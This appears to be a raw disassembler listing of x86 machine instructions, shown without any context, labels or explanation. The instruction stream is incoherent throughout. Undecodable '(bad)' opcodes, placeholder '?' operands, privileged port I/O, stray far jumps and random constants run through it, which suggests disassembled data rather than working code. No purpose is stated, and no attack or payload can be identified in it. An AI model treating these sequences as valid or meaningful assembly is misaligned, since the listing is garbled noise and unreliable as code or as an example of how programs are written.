  4202e9:	fst    QWORD PTR [eax+edi*4+0x71]
  4202ed:	push   cs
  4202ee:	ss jo  0x42032a
  4202f1:	or     eax,0xcdd34345
  4202f6:	push   ds
  4202f7:	fistp  WORD PTR [ecx+0x6b738712]
  4202fd:	push   ecx
  4202fe:	ss jmp 0x5094:0x10b0ae6
  420306:	sub    al,0xfa
  420308:	inc    ecx
  420309:	push   esp
  42030a:	xor    al,0x52
  42030c:	pop    ebp
  42030d:	fwait
  42030e:	mov    ds:0x2cf07c29,eax
  420313:	push   edi
  420314:	jnp    0x420358
  420316:	mov    eax,ds:0xba4ce436
  42031b:	repnz or al,0x3c
  42031e:	jge    0x4202df
  420320:	sbb    eax,0x31b0e8ce
  420325:	inc    ecx
  420326:	xchg   edi,eax
  420327:	push   ds
  420328:	mov    bh,0xcd
  42032a:	inc    ebp
  42032b:	or     bl,BYTE PTR [ecx]
  42032d:	sub    DWORD PTR [ecx+esi*2+0x14],0xf8702c83
  420335:	sbb    DWORD PTR [edi],0x23
  420338:	jg     0x420319
  42033a:	inc    ecx
  42033b:	adc    ecx,DWORD PTR [eax]
  42033d:	jne    0x420341
  42033f:	cmp    eax,0x9e783ad1
  420344:	sbb    edi,DWORD PTR [ebx+ecx*8+0x722deef9]
  42034b:	xchg   edi,eax
  42034c:	fidiv  WORD PTR [ebx-0x1d]
  42034f:	sbb    al,0xc9
  420351:	jp     0x420352
  420353:	test   BYTE PTR [edi+0x50f3a54b],al
  420359:	pop    es
  42035a:	xchg   esi,eax
  42035b:	inc    eax
  42035c:	cmp    BYTE PTR [edi+0x7e9e06ae],bh
  420362:	jle    0x6d4b34c
  420368:	inc    edx
  420369:	hlt    
  42036a:	xchg   BYTE PTR [ecx],ah
  42036c:	out    0x91,al
  42036e:	lock or bh,BYTE PTR [edi]
  420371:	aad    0x9d
  420373:	mov    bh,0xa0
  420375:	mov    ah,0xc9
  420377:	push   cs
  420378:	rol    dl,1
  42037a:	jecxz  0x4203a7
  42037c:	mov    edx,0xbb0ce8f
  420381:	mov    eax,ds:0x2eb4d6f9
  420386:	(bad)  
  420387:	adc    al,0x5c
  420389:	jmp    0x69b3:0xfc61cf0d
  420390:	pop    edx
  420391:	sbb    al,0x45
  420393:	pushf  
  420394:	enter  0x6616,0x87
  420398:	stc    
  420399:	nop
  42039a:	push   esi
  42039b:	inc    edx
  42039c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42039d:	sub    eax,0xdd257446
  4203a2:	aas    
  4203a3:	shr    edx,0x59
  4203a6:	xor    eax,0x2540085d
  4203ab:	xor    ah,BYTE PTR [ebp+0x6814ef8e]
  4203b1:	xchg   esp,eax
  4203b2:	(bad)  
  4203b4:	jae    0x420432
  4203b6:	iret   
  4203b7:	adc    esi,DWORD PTR [edx+0x44f1cf57]
  4203bd:	sub    BYTE PTR [esi],al
  4203bf:	scas   eax,DWORD PTR es:[edi]
  4203c0:	jne    0x42035e
  4203c2:	pop    eax
  4203c3:	and    eax,0xa638a067
  4203c8:	mov    esp,0x8475e272
  4203cd:	ins    BYTE PTR es:[edi],dx
  4203ce:	mov    ah,0x64
  4203d0:	pushf  
  4203d1:	mov    dh,0x42
  4203d3:	lahf   
  4203d4:	adc    BYTE PTR [eax],dh
  4203d6:	push   edx
  4203d7:	lea    esi,[ecx+esi*1+0x29]
  4203db:	jecxz  0x420386
  4203dd:	aam    0xf3
  4203df:	test   BYTE PTR [ebp-0x76],bh
  4203e2:	ins    DWORD PTR es:[edi],dx
  4203e3:	mul    esi
  4203e5:	push   esp
  4203e6:	inc    esi
  4203e7:	jge    0x420454
  4203e9:	dec    edx
  4203ea:	jge    0x420438
  4203ec:	pop    ecx
  4203ed:	adc    al,0xa9
  4203ef:	gs ins BYTE PTR es:[edi],dx
  4203f1:	(bad)  
  4203f2:	ss mov ecx,0xd427401e
  4203f8:	mov    ebx,0xfc5a5874
  4203fd:	mov    BYTE PTR [ebp-0x49c37153],dh
  420403:	enter  0xf24f,0xee
  420407:	xchg   esp,eax
  420408:	int3   
  420409:	mov    bl,0x6b
  42040b:	xchg   edx,eax
  42040c:	test   BYTE PTR [eax+ecx*8-0x685e9fcc],dh
  420413:	and    al,BYTE PTR [eax+eiz*1-0x266623ac]
  42041a:	(bad)  
  42041b:	mov    eax,0x1c7b7342
  420420:	xchg   DWORD PTR [esi*8+0x4cca305a],eax
  420427:	pop    edx
  420428:	push   ebx
  420429:	sbb    al,0x31
  42042b:	jp     0x4203cb
  42042d:	ret    
  42042e:	inc    esi
  42042f:	jmp    0x42044c
  420431:	mov    ecx,0x614f5865
  420436:	test   al,0x2f
  420438:	pop    ds
  420439:	add    al,0x39
  42043b:	or     DWORD PTR [eax],ecx
  42043d:	mov    al,ds:0x325b6b09
  420442:	(bad)  
  420443:	(bad)  [edi+0x48]
  420446:	sbb    edx,0x349f0f1
  42044c:	jns    0x420477
  42044e:	or     DWORD PTR [edx+0x2f52060e],0xc7c45576
  420458:	cdq    
  420459:	mov    ah,0x14
  42045b:	fwait
  42045c:	scas   eax,DWORD PTR es:[edi]
  42045d:	and    eax,0xce40c81b
  420462:	pusha  
  420463:	cmp    dl,ah
  420465:	adc    bl,0x58
  420468:	jo     0x4204a5
  42046a:	arpl   WORD PTR [ebp+0x31],di
  42046d:	cmp    ah,al
  42046f:	jecxz  0x4204ae
  420471:	pop    ebx
  420472:	jl     0x4204b3
  420474:	dec    edi
  420475:	cmp    BYTE PTR [edi],dh
  420477:	ret    
  420478:	sahf   
  420479:	loop   0x4203fd
  42047b:	inc    eax
  42047c:	push   ebp
  42047d:	pop    ebx
  42047e:	mov    dl,bh
  420480:	pop    ss
  420481:	call   0xa28:0x8034345
  420488:	xchg   ebx,eax
  420489:	lods   al,BYTE PTR ds:[esi]
  42048a:	xor    dl,cl
  42048c:	cdq    
  42048d:	jo     0x42041d
  42048f:	dec    eax
  420490:	cmp    eax,0x5f333d93
  420495:	imul   eax,DWORD PTR [eax+0x52c868e8],0x85478787
  42049f:	and    al,0x5d
  4204a1:	dec    ebx
  4204a2:	imul   BYTE PTR [esi+0x62]
  4204a5:	mov    al,BYTE PTR [edi]
  4204a7:	push   esi
  4204a8:	scas   al,BYTE PTR es:[edi]
  4204a9:	ss jbe 0x420475
  4204ac:	jo     0x42045d
  4204ae:	mov    ss,WORD PTR [eax+0x28fa67f9]
  4204b4:	test   BYTE PTR [edi+0x45],bh
  4204b7:	(bad)  
  4204b8:	xchg   DWORD PTR [ebx+0x6f],esp
  4204bb:	aaa    
  4204bc:	sbb    eax,0xfc5fd32a
  4204c1:	loop   0x42052f
  4204c3:	pop    ss
  4204c4:	bound  esp,QWORD PTR [ebx]
  4204c6:	ja     0x42049b
  4204c8:	loop   0x4204ff
  4204ca:	mov    al,BYTE PTR [esi-0x52]
  4204cd:	or     ebx,edx
  4204cf:	mov    ch,0x76
  4204d1:	imul   ebx,DWORD PTR [edx],0xc28fd616
  4204d7:	fistp  WORD PTR [ecx-0x10]
  4204da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204db:	in     al,dx
  4204dc:	pop    edx
  4204dd:	mov    ebp,?
  4204df:	push   cs
  4204e0:	mov    ah,0x58
  4204e2:	dec    ebx
  4204e3:	jg     0x42051d
  4204e5:	enter  0x29ec,0x1
  4204e9:	test   al,dh
  4204eb:	xor    ah,bl
  4204ed:	out    dx,al
  4204ee:	(bad)
  4204f2:	fwait
  4204f3:	sub    DWORD PTR [ecx+0x49],0xffffffab
  4204f7:	xchg   ebp,eax
  4204f8:	pop    ss
  4204f9:	mov    al,ds:0x9cc2fa47
  4204fe:	adc    eax,0x3aa8e088
  420503:	or     eax,0x7f3053aa
  420508:	mov    ds:0x7cf7d705,eax
  42050d:	inc    ecx
  42050e:	xor    bh,BYTE PTR [eax]
  420510:	jo     0x42052b
  420512:	pop    edi
  420513:	(bad)  
  420514:	out    dx,al
  420515:	xor    BYTE PTR ds:0x5b0c829d,0x16
  42051c:	pop    ss
  42051d:	sub    ebp,DWORD PTR [eax+edi*1-0x5acc09]
  420524:	out    0x5f,al
  420526:	test   DWORD PTR [esi-0x16],edx
  420529:	mov    esp,cs
  42052b:	pop    esp
  42052c:	idiv   BYTE PTR [ebx-0x35eba453]
  420532:	cli    
  420533:	int    0xdf
  420535:	loopne 0x42057e
  420537:	jg     0x420565
  420539:	pop    eax
  42053a:	inc    esp
  42053b:	add    edi,ecx
  42053d:	sbb    al,0xa7
  42053f:	stos   BYTE PTR es:[edi],al
  420540:	leave  
  420541:	push   edx
  420542:	ins    BYTE PTR es:[edi],dx
  420543:	jle    0x420575
  420545:	cmp    eax,0x865cee35
  42054a:	icebp  
  42054b:	aam    0xdd
  42054d:	inc    ebx
  42054e:	and    esi,DWORD PTR [ebp+edi*1+0x4152d92d]
  420555:	test   BYTE PTR [ebp-0x565de34b],dl
  42055b:	xchg   edi,eax
  42055c:	adc    ch,dl
  42055e:	cmp    DWORD PTR ds:0xfdf65bab,ebx
  420564:	out    0x1a,eax
  420566:	(bad)  [edi]
  420568:	jge    0x420596
  42056a:	les    ebp,FWORD PTR [ebp-0x388a0282]
  420570:	std    
  420571:	js     0x420544
  420573:	ds int3 
  420575:	gs sub al,0x76
  420578:	xchg   edx,eax
  420579:	mov    esi,0x4582c3ac
  42057e:	jae    0x420598
  420580:	retf   0x7b5c
  420583:	inc    ebx
  420584:	pushf  
  420585:	fsubr  DWORD PTR [edi+esi*8-0x1dad312d]
  42058c:	addr16 pop eax
  42058e:	xchg   ebp,eax
  42058f:	sahf   
  420590:	and    DWORD PTR [edi+0x76],ebx
  420593:	xchg   edx,eax
  420594:	adc    al,0xfa
  420596:	retf   0x16f1
  420599:	pop    esp
  42059a:	(bad)  
  42059b:	inc    BYTE PTR [eax-0x38287dec]
  4205a1:	test   DWORD PTR [eax-0x741f61b5],edi
  4205a7:	popa   
  4205a8:	(bad)  
  4205a9:	outs   dx,BYTE PTR ds:[esi]
  4205aa:	imul   esi,DWORD PTR [edi+ecx*2],0x52330361
  4205b1:	sbb    esi,0x59045ace
  4205b7:	je     0x4205b0
  4205b9:	shr    DWORD PTR [ecx+edx*8],1
  4205bc:	cmp    eax,0x51dbdd9d
  4205c1:	sbb    dl,0xad
  4205c4:	ins    DWORD PTR es:[edi],dx
  4205c5:	mov    esi,esp
  4205c7:	xchg   ebx,eax
  4205c8:	shl    bl,1
  4205ca:	inc    eax
  4205cb:	stos   DWORD PTR es:[edi],eax
  4205cc:	push   cs
  4205cd:	xchg   BYTE PTR cs:[ecx-0x21],bl
  4205d1:	rol    DWORD PTR ds:0xe5b7b33e,0x35
  4205d8:	shl    edx,0x8b
  4205db:	js     0x420573
  4205dd:	cld    
  4205de:	test   al,0x66
  4205e0:	inc    edi
  4205e1:	fnstcw WORD PTR [ecx-0x364349e1]
  4205e7:	loope  0x4205cd
  4205e9:	fs mov eax,0xa69b0245
  4205ef:	fs inc esp
  4205f1:	repnz inc ebp
  4205f3:	sbb    al,0x92
  4205f5:	jle    0x420581
  4205f7:	aaa    
  4205f8:	mov    eax,ds:0x9f95e4b8
  4205fd:	scas   eax,DWORD PTR es:[edi]
  4205fe:	xor    edi,esp
  420600:	cmp    bh,0x53
  420603:	xor    eax,0xcf728bd4
  420608:	push   eax
  420609:	loopne 0x420592
  42060b:	clc    
  42060c:	push   esp
  42060d:	cmp    DWORD PTR [edi],ebp
  42060f:	bound  eax,QWORD PTR ds:0x9ddee062
  420615:	pop    esi
  420616:	outs   dx,DWORD PTR ds:[esi]
  420617:	push   edx
  420618:	dec    esi
  420619:	jae    0x4205f9
  42061b:	jmp    FWORD PTR [ebp+0x6f85c433]
  420621:	pop    edx
  420622:	mov    ds:0x2b35548d,al
  420627:	sbb    dl,bl
  420629:	mov    ebx,0xdaf9b59e
  42062e:	sti    
  42062f:	scas   al,BYTE PTR es:[edi]
  420630:	push   ecx
  420631:	and    DWORD PTR [eax+0x74],ebp
  420634:	aam    0x7
  420636:	pop    edx
  420637:	jge    0x420603
  420639:	aaa    
  42063a:	cld    
  42063b:	xor    DWORD PTR cs:[edi],ebx
  42063e:	mov    dl,0x66
  420640:	pop    ebp
  420641:	ficomp WORD PTR [esi+0x6e789d31]
  420647:	sub    ebx,esp
  420649:	mov    ch,0xb2
  42064b:	pop    ebx
  42064c:	sub    al,0xce
  42064e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42064f:	xor    dl,BYTE PTR [ecx]
  420651:	xchg   edx,eax
  420652:	nop
  420653:	cwde   
  420654:	stos   BYTE PTR es:[edi],al
  420655:	fst    QWORD PTR [esi]
  420657:	push   eax
  420658:	xor    ah,BYTE PTR ds:[edi-0x32]
  42065c:	loope  0x4206d9
  42065e:	jo     0x420663
  420660:	das    
  420661:	test   DWORD PTR [eax+0x61357731],ebx
  420667:	test   al,0x1f
  420669:	cmp    cl,BYTE PTR [edi]
  42066b:	xlat   BYTE PTR ds:[ebx]
  42066c:	das    
  42066d:	mov    esi,es
  42066f:	pop    ss
  420670:	adc    BYTE PTR [ebx+0x25],dh
  420673:	aaa    
  420674:	inc    ebx
  420675:	inc    eax
  420676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420677:	pushf  
  420678:	in     al,0x1e
  42067a:	mov    ds:0x42e23dd,eax
  42067f:	mov    WORD PTR [edx],?
  420681:	jmp    0xb36978c2
  420686:	test   eax,0xd3d2beb
  42068b:	aas    
  42068c:	icebp  
  42068d:	inc    esp
  42068e:	test   al,0x4a
  420690:	jmp    0x2932bdaa
  420695:	aad    0x13
  420697:	adc    BYTE PTR [eax-0x17aa954a],0xe9
  42069e:	stc    
  42069f:	pop    eax
  4206a0:	adc    esi,DWORD PTR [ebp+0xb]
  4206a3:	mov    bl,cl
  4206a5:	xor    al,BYTE PTR [ebx]
  4206a7:	pop    edx
  4206a8:	lea    eax,[ebx+0x1d8e5c24]
  4206ae:	fstp   QWORD PTR [edx-0x6ff3d2f3]
  4206b4:	push   ds
  4206b5:	mov    al,0x2a
  4206b7:	popa   
  4206b8:	add    DWORD PTR [edi+ecx*8+0x13],ebp
  4206bc:	lods   al,BYTE PTR ds:[esi]
  4206bd:	retf   0x2761
  4206c0:	inc    esi
  4206c1:	dec    eax
  4206c2:	lahf   
  4206c3:	mov    ?,esp
  4206c5:	mov    edx,0x936e0039
  4206ca:	pushf  
  4206cb:	push   cs
  4206cc:	js     0x42071d
  4206ce:	or     BYTE PTR ds:0x2e623f9d,dh
  4206d4:	pop    edi
  4206d5:	mov    ebx,0x64d5e80
  4206da:	(bad)  
  4206db:	push   ds
  4206dc:	dec    esp
  4206dd:	in     eax,0x43
  4206df:	daa    
  4206e0:	sbb    BYTE PTR [esi+0x4875b2ed],cl
  4206e6:	je     0x4206bb
  4206e8:	pushf  
  4206e9:	fs xchg ebx,eax
  4206eb:	mov    cl,BYTE PTR [ebp+0x72686d23]
  4206f1:	adc    eax,0x63e427a6
  4206f6:	xor    BYTE PTR [edx+edx*2-0x3],ah
  4206fa:	mov    edx,0x9e1c2d52
  4206ff:	sbb    ecx,DWORD PTR [ebx]
  420701:	mov    bl,0xe3
  420703:	retf   0xa84c
  420706:	and    dl,BYTE PTR [ecx-0x48]
  420709:	mov    edi,0x371f2e21
  42070e:	fisubr WORD PTR [edi+0x2ee54edf]
  420714:	push   ebp
  420715:	xor    ecx,ecx
  420717:	lds    ebp,FWORD PTR [ecx+0x77]
  42071a:	pop    esi
  42071b:	loop   0x42070c
  42071d:	jg     0x4206ab
  42071f:	repnz inc ecx
  420721:	cdq    
  420722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420723:	dec    eax
  420724:	inc    esi
  420725:	jge    0x4206b4
  420727:	scas   al,BYTE PTR es:[edi]
  420728:	xchg   ecx,eax
  420729:	push   cs
  42072a:	mov    ch,ch
  42072c:	jnp    0x42076c
  42072e:	xor    BYTE PTR [edx-0xb10f49b],0xf3
  420735:	jo     0x42079c
  420737:	sbb    BYTE PTR [edi+0x25a9abc0],ch
  42073d:	xor    BYTE PTR [eax+0x3be7e0ee],dl
  420743:	(bad)  
  420744:	fst    DWORD PTR [eax]
  420746:	lock push ebx
  420748:	mov    ah,0x20
  42074a:	and    bl,0x99
  42074d:	xchg   ecx,eax
  42074e:	int3   
  42074f:	push   edi
  420750:	sbb    eax,0x3bdcd0e6
  420755:	stos   DWORD PTR es:[edi],eax
  420756:	das    
  420757:	push   edx
  420758:	ret    0xd36b
  42075b:	xor    al,0x1e
  42075d:	cdq    
  42075e:	mov    ?,WORD PTR [ecx]
  420760:	jecxz  0x42078e
  420762:	jb     0x4207c6
  420764:	sub    eax,0x22d04c2e
  420769:	pop    esi
  42076a:	add    BYTE PTR [eax+0x17],0xa7
  42076e:	int    0x88
  420770:	fcomp  QWORD PTR [edx+eiz*4-0x7f]
  420774:	adc    al,0xe1
  420776:	cli    
  420777:	les    ebx,FWORD PTR [ebx+0x3222dd8]
  42077d:	jmp    0xe49c:0xe33019c8
  420784:	mov    ch,0x32
  420786:	cmp    DWORD PTR [esi+eiz*1],0xf04124d0
  42078d:	enter  0xdbf1,0x87
  420791:	ret    0x2ebe
  420794:	and    DWORD PTR [eax+0xd],ebp
  420797:	shl    DWORD PTR [eax+0x58],0x3f
  42079b:	push   esi
  42079c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42079d:	xor    esp,ebp
  42079f:	jnp    0x42077e
  4207a1:	xor    edi,esp
  4207a3:	push   ecx
  4207a4:	icebp  
  4207a5:	xchg   edi,eax
  4207a6:	jecxz  0x42073b
  4207a8:	jne    0x4207b5
  4207aa:	cmp    eax,0x22ca030f
  4207af:	iret   
  4207b0:	or     eax,0x39561038
  4207b5:	push   ecx
  4207b6:	test   BYTE PTR [edx],dh
  4207b8:	stc    
  4207b9:	or     DWORD PTR [edx+0x35],esi
  4207bc:	jb     0x4207d7
  4207be:	cs retf 
  4207c0:	mov    ch,0xba
  4207c2:	shl    DWORD PTR [eax],cl
  4207c4:	xor    al,0x27
  4207c6:	mov    dh,0x5e
  4207c8:	pusha  
  4207c9:	dec    esi
  4207ca:	mov    al,0x31
  4207cc:	sbb    al,0x3d
  4207ce:	sahf   
  4207cf:	xchg   ecx,eax
  4207d0:	xor    ebp,esi
  4207d2:	and    DWORD PTR [ebp+0x69],eax
  4207d5:	jmp    0x42079d
  4207d7:	sar    dl,1
  4207d9:	cdq    
  4207da:	es nop
  4207dc:	loope  0x420834
  4207de:	dec    esp
  4207df:	sub    ah,0xfd
  4207e2:	xor    eax,0xcd43014c
  4207e7:	mov    ah,0x73
  4207e9:	std    
  4207ea:	in     al,0xea
  4207ec:	enter  0x43ea,0xc
  4207f0:	stos   DWORD PTR es:[edi],eax
  4207f1:	sub    al,BYTE PTR [esi]
  4207f3:	push   ecx
  4207f4:	mov    esi,?
  4207f6:	jg     0x4207fc
  4207f8:	adc    al,0x42
  4207fa:	pop    eax
  4207fb:	jb     0x4207ea
  4207fd:	loopne 0x420862
  4207ff:	outs   dx,DWORD PTR ds:[esi]
  420800:	aad    0x99
  420802:	je     0x4207ba
  420804:	loop   0x4207b1
  420806:	fiadd  WORD PTR [edx-0x1d]
  420809:	add    edx,ebp
  42080b:	inc    edx
  42080c:	rol    BYTE PTR [ebx-0x73f725dd],cl
  420812:	and    esi,DWORD PTR [edi-0x1e1f10c6]
  420818:	or     bh,BYTE PTR [esi]
  42081a:	gs call 0xbc5bbdc1
  420820:	mov    ebp,0x6a026831
  420825:	ror    ebp,cl
  420827:	pop    es
  420828:	inc    eax
  420829:	sbb    eax,ecx
  42082b:	test   esp,ebx
  42082d:	push   ebp
  42082e:	adc    ch,BYTE PTR [esi+eiz*2-0x64]
  420832:	xor    dl,BYTE PTR ss:[esp+eax*1-0xf0b2ae9]
  42083a:	aas    
  42083b:	aad    0x58
  42083d:	xchg   esi,eax
  42083e:	repz add DWORD PTR [edx],ebp
  420841:	and    eax,0x6f624a61
  420846:	aam    0x80
  420848:	inc    ebx
  420849:	inc    edx
  42084a:	mov    esp,0x8deb4484
  42084f:	mov    bl,0x1c
  420851:	pusha  
  420852:	sub    ebp,DWORD PTR [ebx-0x2f997ab8]
  420858:	xchg   cl,ch
  42085a:	test   al,0x16
  42085c:	pop    es
  42085d:	ret    
  42085e:	or     al,0xdc
  420860:	pop    es
  420861:	out    dx,al
  420862:	xor    ah,BYTE PTR [edx-0x62d32253]
  420868:	xchg   BYTE PTR [edx-0x5544f020],dl
  42086e:	jp     0x4207f7
  420870:	add    al,0x89
  420872:	mov    edx,0xb083a389
  420877:	xchg   edx,eax
  420878:	add    BYTE PTR [eax-0x2f],dl
  42087b:	pop    esi
  42087c:	adc    BYTE PTR [eax],ah
  42087e:	cld    
  42087f:	sub    eax,0x3256abdc
  420884:	xor    al,0xe3
  420886:	jnp    0x420816
  420888:	push   0x3bba7966
  42088d:	sbb    dh,BYTE PTR [ebx-0x68]
  420890:	push   edi
  420891:	adc    eax,0x6366ef45
  420896:	cmp    ebp,DWORD PTR [edx+0x24]
  420899:	jmp    0x4208d0
  42089b:	inc    edx
  42089c:	xchg   ecx,eax
  42089d:	push   esi
  42089e:	dec    ecx
  42089f:	out    dx,eax
  4208a0:	loope  0x420920
  4208a2:	call   0x34fb281d
  4208a7:	les    ecx,FWORD PTR [edi-0x2e797a72]
  4208ad:	outs   dx,BYTE PTR ds:[esi]
  4208ae:	pusha  
  4208af:	sub    al,0xc3
  4208b1:	loopne 0x420851
  4208b3:	sahf   
  4208b4:	in     al,0x56
  4208b6:	cmc    
  4208b7:	inc    edx
  4208b8:	retf   0x9fe
  4208bb:	sub    BYTE PTR [ebx+edi*4-0x228ef963],0xd3
  4208c3:	jg     0x4208e8
  4208c5:	jge    0x42088e
  4208c7:	js     0x4208a0
  4208c9:	lock inc edx
  4208cb:	add    dh,BYTE PTR [esi]
  4208cd:	cli    
  4208ce:	jmp    0x420898
  4208d0:	outs   dx,DWORD PTR ds:[esi]
  4208d1:	inc    ecx
  4208d2:	mov    bh,0x2f
  4208d4:	dec    BYTE PTR [edx+0x5ddc9905]
  4208da:	and    edi,eax
  4208dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208dd:	mov    ds:0x2f61032b,eax
  4208e2:	scas   eax,DWORD PTR es:[edi]
  4208e3:	inc    ebp
  4208e4:	call   0x9edc5d96
  4208e9:	jbe    0x420949
  4208eb:	adc    al,dh
  4208ed:	jno    0x42091a
  4208ef:	in     al,0xa6
  4208f1:	js     0x420873
  4208f3:	test   BYTE PTR [eax-0x725d6fed],bh
  4208f9:	xchg   BYTE PTR [edi-0x7a],dl
  4208fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208fd:	jp     0x4208fe
  4208ff:	retf   0x3101
  420902:	inc    ebx
  420903:	mov    bh,0x45
  420905:	pop    ecx
  420906:	mov    al,0x2
  420908:	ret    0x8da7
  42090b:	sahf   
  42090c:	mov    eax,ds:0xf893d52f
  420911:	xor    bh,bh
  420913:	add    esi,esp
  420915:	retf   
  420916:	add    al,BYTE PTR [edx]
  420918:	mov    DWORD PTR [edx+0x3e1b6207],edi
  42091e:	cwde   
  42091f:	sub    esi,DWORD PTR [edx]
  420921:	outs   dx,DWORD PTR ds:[esi]
  420922:	ret    
  420923:	cmp    BYTE PTR [esi],dh
  420925:	in     eax,dx
  420926:	xor    ebx,ebx
  420928:	and    al,0x2e
  42092a:	mov    edx,0x7a3e18b3
  42092f:	lahf   
  420930:	inc    eax
  420931:	inc    esp
  420932:	mov    dl,0xb8
  420934:	addr16 sbb al,0x25
  420937:	fs test eax,0xfd88f370
  42093d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42093e:	inc    edi
  42093f:	stc    
  420940:	push   0x24ab37d1
  420945:	mov    dh,0x2c
  420947:	aas    
  420948:	ins    DWORD PTR es:[edi],dx
  420949:	or     BYTE PTR [edi+0x63],al
  42094c:	mov    ds:0x951172e3,eax
  420951:	pop    ds
  420952:	mov    eax,ds:0xc54d0773
  420957:	ret    
  420958:	inc    ecx
  420959:	xor    eax,0xd7729d5c
  42095e:	inc    edx
  42095f:	ror    BYTE PTR [ebx-0x67],0x66
  420963:	lahf   
  420964:	sub    eax,0x88c34ce1
  420969:	mov    ds:0x41ebfdcd,al
  42096e:	adc    DWORD PTR [edx+0x2ed71ed3],esp
  420974:	lods   al,BYTE PTR es:[esi]
  420976:	xor    DWORD PTR [ecx],edx
  420978:	jg     0x420997
  42097a:	push   edi
  42097b:	sar    BYTE PTR [ecx-0x31],1
  42097e:	ss mov bh,0xc7
  420981:	inc    eax
  420982:	jnp    0x4209bb
  420984:	test   BYTE PTR [eax+0x3c],bh
  420987:	mov    ds:0xb3a4519d,al
  42098c:	repz mov ebx,0x404c2552
  420992:	test   DWORD PTR [esi+0x21b684f8],ebp
  420998:	hlt    
  420999:	in     eax,0x98
  42099b:	jmp    0xf231:0x65be5115
  4209a2:	fnstsw WORD PTR [ebx-0x216c4924]
  4209a8:	lock push 0x11395670
  4209ae:	addr16 push 0xb07e5557
  4209b4:	outs   dx,DWORD PTR ds:[esi]
  4209b5:	inc    ebp
  4209b6:	or     al,al
  4209b8:	push   ebx
  4209b9:	adc    DWORD PTR ds:0x3aebdae7,esp
  4209bf:	fnstcw WORD PTR fs:[ecx+0x45]
  4209c3:	push   ecx
  4209c4:	mov    BYTE PTR [ebp-0x30],cl
  4209c7:	pop    ds
  4209c8:	xor    bl,al
  4209ca:	jge    0x42096d
  4209cc:	daa    
  4209cd:	jbe    0x420a41
  4209cf:	cmp    eax,0x87cce183
  4209d4:	popa   
  4209d5:	retf   
  4209d6:	xor    al,0x10
  4209d8:	inc    esi
  4209d9:	aad    0xe9
  4209db:	aad    0x49
  4209dd:	mov    bh,0x74
  4209df:	jecxz  0x420a16
  4209e1:	test   al,0xe
  4209e3:	ret    
  4209e4:	addr16 jae 0x4209b6
  4209e7:	fiadd  DWORD PTR [edi+0x53]
  4209ea:	add    al,0xa7
  4209ec:	gs adc bl,al
  4209ef:	jbe    0x420971
  4209f1:	cmp    eax,0xc5000ae
  4209f6:	cwde   
  4209f7:	add    al,0x85
  4209f9:	imul   edx,DWORD PTR [esi+0x49],0x2c5ae4c8
  420a00:	sbb    al,0xb2
  420a02:	mov    ds:0xc7775618,al
  420a07:	mov    es,WORD PTR [edi-0x49f2cc46]
  420a0d:	shl    ah,0xb8
  420a10:	test   BYTE PTR [eax+0x47],bl
  420a13:	mov    ecx,0x625445b9
  420a18:	adc    DWORD PTR [edi-0x6ee41826],edi
  420a1e:	or     dl,BYTE PTR [ecx-0x3a5f5218]
  420a24:	ret    0xd7e
  420a27:	mov    ecx,0x9da35788
  420a2c:	pop    ebx
  420a2d:	cmc    
  420a2e:	sub    bl,bl
  420a30:	xor    al,BYTE PTR [ebx]
  420a32:	repz lea ebp,[eax]
  420a35:	pop    edi
  420a36:	mov    WORD PTR [eax+0x50],cs
  420a39:	scas   eax,DWORD PTR es:[edi]
  420a3a:	dec    ecx
  420a3b:	cwde   
  420a3c:	cmp    eax,0x8170619a
  420a41:	repnz loop 0x420a77
  420a44:	xchg   ebx,eax
  420a45:	xchg   esi,eax
  420a46:	aad    0xe3
  420a48:	clc    
  420a49:	test   eax,0xd34bba54
  420a4e:	pop    ds
  420a4f:	pushf  
  420a50:	ss and ecx,ebx
  420a53:	mov    eax,0x37387528
  420a58:	cwde   
  420a59:	mov    edi,DWORD PTR [edi-0x51]
  420a5c:	fstp   DWORD PTR [ebx]
  420a5e:	or     al,0xc4
  420a60:	mov    ds:0x256bd6af,eax
  420a65:	lock or al,0x49
  420a68:	xchg   esp,eax
  420a69:	mov    bh,0xe7
  420a6b:	scas   eax,DWORD PTR es:[edi]
  420a6c:	cmp    al,0xca
  420a6e:	cmp    DWORD PTR [ebp+0x14a19a51],0xfffffff1
  420a75:	pop    ebp
  420a76:	cwde   
  420a77:	test   BYTE PTR [ecx],cl
  420a79:	jecxz  0x420a30
  420a7b:	aad    0x63
  420a7d:	pop    edx
  420a7e:	jmp    FWORD PTR [ebp+0x5]
  420a81:	inc    edx
  420a82:	hlt    
  420a83:	add    esi,esp
  420a85:	jo     0x420afc
  420a87:	and    eax,0x952db54e
  420a8c:	mov    ch,0x87
  420a8e:	inc    edi
  420a8f:	retf   0x2c2e
  420a92:	jl     0x420a42
  420a94:	inc    ebp
  420a95:	xchg   edx,eax
  420a96:	jno    0x420a24
  420a98:	pusha  
  420a99:	or     ebp,DWORD PTR [esi+0x4ee8d6a2]
  420a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa0:	loope  0x420a6d
  420aa2:	add    ebx,ebp
  420aa4:	jo     0x420a4a
  420aa6:	inc    esp
  420aa7:	popf   
  420aa8:	add    DWORD PTR [esi-0x2f697f97],esi
  420aae:	ficomp WORD PTR [ebx+0x29597706]
  420ab4:	adc    al,0xae
  420ab6:	mov    ah,0x13
  420ab8:	je     0x420b1b
  420aba:	dec    ebp
  420abb:	hlt    
  420abc:	mov    ecx,0x4c1267f7
  420ac1:	popa   
  420ac2:	mov    dl,0x5c
  420ac4:	jp     0x420af5
  420ac6:	push   edx
  420ac7:	in     eax,dx
  420ac8:	loope  0x420aeb
  420aca:	rcl    BYTE PTR [ebx-0x25],1
  420acd:	fwait
  420ace:	dec    eax
  420acf:	hlt    
  420ad0:	test   eax,0x322f46e3
  420ad5:	enter  0xe9b3,0xf1
  420ad9:	jecxz  0x420a91
  420adb:	xor    al,0x5
  420add:	out    0xa4,al
  420adf:	sar    DWORD PTR [esi+0x27239856],cl
  420ae5:	loopne 0x420b5f
  420ae7:	dec    ecx
  420ae8:	add    BYTE PTR [edx+0x5e],0x9c
